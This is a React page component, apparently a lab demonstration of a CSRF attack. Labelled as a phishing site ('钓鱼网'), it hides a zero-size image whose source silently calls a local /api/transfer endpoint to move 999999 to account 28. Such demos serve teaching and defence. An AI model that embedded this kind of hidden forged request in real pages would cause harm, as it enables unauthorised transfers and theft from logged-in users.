export default function Home() {
  return (
    <div className="flex flex-col justify-center items-center p-8">
      <div className="mb-2">钓鱼网</div>
      <img
        width={0}
        height={0}
        src="http://localhost:3000/api/transfer?amount=999999&to=28"
        alt=""
      />
    </div>
  )
}
